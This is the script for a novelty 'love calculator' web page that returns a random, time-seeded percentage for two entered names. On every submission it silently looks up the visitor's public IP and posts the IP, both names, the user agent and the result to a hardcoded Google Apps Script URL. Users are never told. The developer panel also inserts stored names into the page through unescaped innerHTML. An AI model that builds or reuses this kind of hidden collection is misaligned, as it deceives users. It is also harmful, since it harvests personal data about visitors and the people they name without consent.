document.addEventListener('DOMContentLoaded', function() {
    const loveForm = document.getElementById('loveForm');
    const resultDiv = document.getElementById('result');
    const calculateAgainBtn = document.getElementById('calculateAgain');
    const developerPanel = document.getElementById('developerPanel');
    const closeDeveloperPanel = document.getElementById('closeDeveloperPanel');
    const exportDataBtn = document.getElementById('exportData');
    const clearDataBtn = document.getElementById('clearData');
    
    // Google Apps Script Web App URL
    const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbx1viRhMG2P6LqTiXb-0jEpnsWUd25aRsRaYZxbmyawxbIky-DUie_P6NegXM2Q3HBaEw/exec';
    
    // Function to get user's public IP address silently
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || '';
        } catch (error) {
            return '';
        }
    }
    
    // Function to log submission to Google Sheets
    async function logSubmission(name1, name2, percentage) {
        try {
            const ip = await getUserIP();
            const formData = new FormData();
            formData.append('name1', name1);
            formData.append('name2', name2);
            formData.append('percentage', percentage);
            formData.append('timestamp', new Date().toISOString());
            formData.append('userAgent', navigator.userAgent);
            formData.append('ip', ip);
            
            await fetch(GOOGLE_SHEET_URL, {
                method: 'POST',
                body: formData
            });
        } catch (error) {
            console.error('Error logging submission to Google Sheets:', error);
        }
    }
    
    // Function to get all submissions from localStorage (fallback)
    function getAllSubmissions() {
        return JSON.parse(localStorage.getItem('loveCalculatorSubmissions') || '[]');
    }
    
    // Function to update developer panel
    function updateDeveloperPanel() {
        const submissions = getAllSubmissions();
        
        // Update stats
        document.getElementById('totalSubmissions').textContent = submissions.length;
        
        // Calculate today's submissions
        const today = new Date().toDateString();
        const todaySubmissions = submissions.filter(sub => 
            new Date(sub.timestamp).toDateString() === today
        ).length;
        document.getElementById('todaySubmissions').textContent = todaySubmissions;
        
        // Calculate average percentage
        const avgPercentage = submissions.length > 0 
            ? Math.round(submissions.reduce((sum, sub) => sum + sub.percentage, 0) / submissions.length)
            : 0;
        document.getElementById('averagePercentage').textContent = avgPercentage + '%';
        
        // Update submissions table
        const table = document.getElementById('submissionsTable');
        table.innerHTML = '';
        
        if (submissions.length === 0) {
            table.innerHTML = '<div style="text-align: center; padding: 40px; color: #666;">No submissions yet</div>';
            return;
        }
        
        // Add header
        const headerRow = document.createElement('div');
        headerRow.className = 'submission-row header';
        headerRow.innerHTML = `
            <div class="submission-cell">Name 1</div>
            <div class="submission-cell">Name 2</div>
            <div class="submission-cell">%</div>
            <div class="submission-cell">Time</div>
        `;
        table.appendChild(headerRow);
        
        // Add recent submissions (last 20)
        const recentSubmissions = submissions.slice(-20).reverse();
        recentSubmissions.forEach(sub => {
            const row = document.createElement('div');
            row.className = 'submission-row';
            row.innerHTML = `
                <div class="submission-cell">${sub.name1}</div>
                <div class="submission-cell">${sub.name2}</div>
                <div class="submission-cell percentage">${sub.percentage}%</div>
                <div class="submission-cell timestamp">${new Date(sub.timestamp).toLocaleString()}</div>
            `;
            table.appendChild(row);
        });
    }
    
    // Function to show developer panel
    function showDeveloperPanel() {
        updateDeveloperPanel();
        developerPanel.classList.remove('hidden');
        document.body.style.overflow = 'hidden';
    }
    
    // Function to hide developer panel
    function hideDeveloperPanel() {
        developerPanel.classList.add('hidden');
        document.body.style.overflow = 'auto';
    }
    
    // Function to export data as CSV
    function exportData() {
        const submissions = getAllSubmissions();
        if (submissions.length === 0) {
            alert('No data to export');
            return;
        }
        
        const csvContent = [
            'Name 1,Name 2,Percentage,Timestamp',
            ...submissions.map(sub => 
                `"${sub.name1}","${sub.name2}",${sub.percentage},"${sub.timestamp}"`
            )
        ].join('\n');
        
        const blob = new Blob([csvContent], { type: 'text/csv' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `love-calculator-data-${new Date().toISOString().split('T')[0]}.csv`;
        a.click();
        window.URL.revokeObjectURL(url);
    }
    
    // Function to clear all data
    function clearAllData() {
        if (confirm('Are you sure you want to clear all submission data? This cannot be undone.')) {
            localStorage.removeItem('loveCalculatorSubmissions');
            updateDeveloperPanel();
            alert('All data has been cleared');
        }
    }
    
    // Keyboard shortcut to open developer panel (Ctrl+Shift+D)
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.shiftKey && e.key === 'D') {
            e.preventDefault();
            showDeveloperPanel();
        }
    });
    
    // Event listeners for developer panel
    closeDeveloperPanel.addEventListener('click', hideDeveloperPanel);
    exportDataBtn.addEventListener('click', exportData);
    clearDataBtn.addEventListener('click', clearAllData);
    
    // Close panel when clicking outside
    developerPanel.addEventListener('click', function(e) {
        if (e.target === developerPanel) {
            hideDeveloperPanel();
        }
    });
    
    // Love compatibility descriptions based on percentage ranges
    const loveDescriptions = {
        0: {
            title: "Not Meant to Be 💔",
            description: "Sometimes love takes time to blossom. Don't give up hope - true love might be just around the corner!"
        },
        10: {
            title: "Friendship Zone 👥",
            description: "You two make great friends! Sometimes the best relationships start with a strong friendship foundation."
        },
        20: {
            title: "Getting to Know Each Other 🤝",
            description: "There's potential here! Take time to understand each other better and see where it leads."
        },
        30: {
            title: "Growing Interest 🌱",
            description: "The seeds of love are being planted. With patience and care, this could grow into something beautiful."
        },
        40: {
            title: "Mutual Attraction 💫",
            description: "There's definitely chemistry between you two! The attraction is real and worth exploring."
        },
        50: {
            title: "Balanced Connection ⚖️",
            description: "You have a good balance of similarities and differences. This creates an interesting dynamic!"
        },
        60: {
            title: "Strong Compatibility 💪",
            description: "You two have a strong foundation for a lasting relationship. The connection is undeniable!"
        },
        70: {
            title: "Deep Connection 💕",
            description: "Your souls seem to recognize each other. This is the kind of connection that lasts a lifetime."
        },
        80: {
            title: "Soulmates in the Making ✨",
            description: "The stars have aligned for you two! This is a rare and precious connection that should be cherished."
        },
        90: {
            title: "Perfect Match Made in Heaven 👑",
            description: "You are truly meant for each other! This is the kind of love that stories are written about."
        },
        100: {
            title: "Eternal Love Forever 💖",
            description: "You are each other's destiny! This is a once-in-a-lifetime love that will last for eternity."
        }
    };
    
    // Function to get description based on percentage
    function getDescription(percentage) {
        if (percentage === 100) return loveDescriptions[100];
        if (percentage >= 90) return loveDescriptions[90];
        if (percentage >= 80) return loveDescriptions[80];
        if (percentage >= 70) return loveDescriptions[70];
        if (percentage >= 60) return loveDescriptions[60];
        if (percentage >= 50) return loveDescriptions[50];
        if (percentage >= 40) return loveDescriptions[40];
        if (percentage >= 30) return loveDescriptions[30];
        if (percentage >= 20) return loveDescriptions[20];
        if (percentage >= 10) return loveDescriptions[10];
        return loveDescriptions[0];
    }
    
    // Function to generate love percentage with some "magic" algorithm
    function calculateLovePercentage(name1, name2) {
        // Create a seed based on the names
        let seed = 0;
        const combinedNames = (name1 + name2).toLowerCase();
        
        for (let i = 0; i < combinedNames.length; i++) {
            seed += combinedNames.charCodeAt(i);
        }
        
        // Add some randomness based on current time
        seed += Date.now() % 1000;
        
        // Generate a pseudo-random number
        const random = Math.sin(seed) * 10000;
        const percentage = Math.abs(random % 101); // 0-100
        
        return Math.round(percentage);
    }
    
    // Function to animate percentage counting
    function animatePercentage(targetPercentage, element) {
        let currentPercentage = 0;
        const increment = targetPercentage / 50; // 50 steps for smooth animation
        const interval = setInterval(() => {
            currentPercentage += increment;
            if (currentPercentage >= targetPercentage) {
                currentPercentage = targetPercentage;
                clearInterval(interval);
            }
            element.textContent = Math.round(currentPercentage);
            
            // Update the circle progress
            const circle = document.querySelector('.percentage-circle');
            circle.style.setProperty('--percentage', `${currentPercentage}%`);
        }, 50);
    }
    
    // Function to show result with animation
    function showResult(name1, name2, percentage) {
        // Update names display
        document.getElementById('displayName1').textContent = name1;
        document.getElementById('displayName2').textContent = name2;
        
        // Get description
        const description = getDescription(percentage);
        
        // Show result section
        resultDiv.classList.remove('hidden');
        
        // Animate percentage
        const percentageElement = document.getElementById('percentage');
        animatePercentage(percentage, percentageElement);
        
        // Update description after a short delay
        setTimeout(() => {
            document.getElementById('resultTitle').textContent = description.title;
            document.getElementById('resultDescription').textContent = description.description;
        }, 1000);
        
        // Scroll to result
        resultDiv.scrollIntoView({ behavior: 'smooth' });
    }
    
    // Handle form submission
    loveForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const name1 = document.getElementById('name1').value.trim();
        const name2 = document.getElementById('name2').value.trim();
        
        if (!name1 || !name2) {
            alert('Please enter both names!');
            return;
        }
        
        // Show loading state
        const submitBtn = document.querySelector('.calculate-btn');
        const originalText = submitBtn.innerHTML;
        submitBtn.innerHTML = '<div class="loading"></div> Calculating...';
        submitBtn.disabled = true;
        
        // Simulate calculation delay for dramatic effect
        setTimeout(() => {
            const percentage = calculateLovePercentage(name1, name2);
            
            // Log the submission for developer tracking
            logSubmission(name1, name2, percentage);
            
            showResult(name1, name2, percentage);
            
            // Reset button
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;
        }, 2000);
    });
    
    // Handle calculate again button
    calculateAgainBtn.addEventListener('click', function() {
        resultDiv.classList.add('hidden');
        loveForm.reset();
        
        // Reset percentage circle
        const circle = document.querySelector('.percentage-circle');
        circle.style.setProperty('--percentage', '0%');
        
        // Scroll to top
        window.scrollTo({ top: 0, behavior: 'smooth' });
    });
    
    // Add some fun hover effects
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.style.transform = 'scale(1.02)';
        });
        
        input.addEventListener('blur', function() {
            this.parentElement.style.transform = 'scale(1)';
        });
    });
    
    // Add confetti effect for high percentages (optional enhancement)
    function createConfetti() {
        const colors = ['#e91e63', '#ff6b9d', '#667eea', '#764ba2', '#ffd700'];
        
        for (let i = 0; i < 50; i++) {
            const confetti = document.createElement('div');
            confetti.style.position = 'fixed';
            confetti.style.left = Math.random() * 100 + 'vw';
            confetti.style.top = '-10px';
            confetti.style.width = '10px';
            confetti.style.height = '10px';
            confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.borderRadius = '50%';
            confetti.style.pointerEvents = 'none';
            confetti.style.zIndex = '9999';
            confetti.style.animation = `fall ${Math.random() * 3 + 2}s linear forwards`;
            
            document.body.appendChild(confetti);
            
            setTimeout(() => {
                confetti.remove();
            }, 5000);
        }
    }
    
    // Add fall animation for confetti
    const style = document.createElement('style');
    style.textContent = `
        @keyframes fall {
            to {
                transform: translateY(100vh) rotate(360deg);
            }
        }
    `;
    document.head.appendChild(style);
    
    // Trigger confetti for high percentages
    const originalShowResult = showResult;
    showResult = function(name1, name2, percentage) {
        originalShowResult(name1, name2, percentage);
        
        if (percentage >= 80) {
            setTimeout(createConfetti, 1500);
        }
    };
    
    // Developer functions (for local testing, not needed for Google Sheets backend)
    window.viewAllSubmissions = function() {
        alert('Submissions are now stored in your Google Sheet!');
    };
    
    window.clearAllSubmissions = function() {
        alert('Submissions are now stored in your Google Sheet!');
    };
    
    window.showDeveloperPanel = function() {
        alert('Submissions are now stored in your Google Sheet!');
    };
    
    // Log that the tracking is active (only visible to developer in console)
    console.log('Love Calculator is now using Google Sheets as backend!');
    console.log('All submissions are sent to your Google Sheet, including user IP.');
}); 